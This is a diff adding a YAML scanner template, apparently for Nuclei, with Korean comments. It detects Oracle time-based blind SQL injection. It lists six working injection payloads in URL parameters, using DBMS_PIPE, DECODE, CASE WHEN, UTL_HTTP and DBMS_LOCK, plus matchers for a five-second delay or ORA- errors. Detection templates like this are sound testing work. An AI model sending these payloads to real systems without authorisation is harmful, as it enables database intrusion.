@@ -1,0 +1,38 @@
+id: sqli-time-based-oracle
+
+info:
+  name: Oracle Time-Based Blind SQL Injection (DBMS_PIPE/LOCK)
+  author: security-researcher
+  severity: high
+  description: |
+    Oracle 데이터베이스에서 시간 지연을 이용한 블라인드 SQL 인젝션을 탐지합니다.
+    DBMS_PIPE.RECEIVE_MESSAGE, UTL_HTTP, DBMS_LOCK 등을 활용합니다.
+  tags: sqli,oracle,time-based,blind,injection
+
+http:
+  - method: GET
+    path:
+      # DBMS_PIPE를 이용한 시간 지연
+      - "{{BaseURL}}?id=1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"
+      - "{{BaseURL}}?id=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"
+      # DECODE + DBMS_PIPE 조합
+      - "{{BaseURL}}?id=1' AND 1=DECODE(1,1,DBMS_PIPE.RECEIVE_MESSAGE('a',5))--"
+      # CASE WHEN 기반
+      - "{{BaseURL}}?id=1' AND CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END=1--"
+      # UTL_HTTP 요청 (OOB 가능)
+      - "{{BaseURL}}?id=1' AND 1=UTL_HTTP.REQUEST('http://127.0.0.1:1')--"
+      # DBMS_LOCK (Oracle 11g 이상)
+      - "{{BaseURL}}?id=1' AND 1=DBMS_LOCK.SLEEP(5)--"
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5000"
+
+      - type: regex
+        part: body
+        regex:
+          - "ORA-\\d{5}"
+          - "OracleException"
+        case-insensitive: true
